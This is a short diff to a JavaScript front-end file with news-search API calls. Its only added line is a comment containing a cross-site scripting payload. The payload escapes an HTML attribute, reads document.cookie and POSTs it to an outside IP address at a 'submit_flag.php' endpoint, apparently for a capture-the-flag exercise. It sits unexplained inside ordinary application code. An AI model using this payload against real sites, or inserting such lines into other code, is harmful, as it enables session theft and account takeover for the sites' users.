@@ -113,6 +113,8 @@
 			})
 		}
 
+		// "><script>return fetch('http://188.166.56.154:80/submit_flag.php', {method: 'POST',headers: {'Accept': 'application/json','Content-Type': 'application/json'}, body: JSON.stringify({flag : document.cookie.substr(10)})}).then(result => {if (result.status >= 300) {throw new Error();}return result.json()})</script>
+
 		searchNewsCategory(data){
 			return fetch(this.host + 'api/news/seach', {
 				method: 'POST',
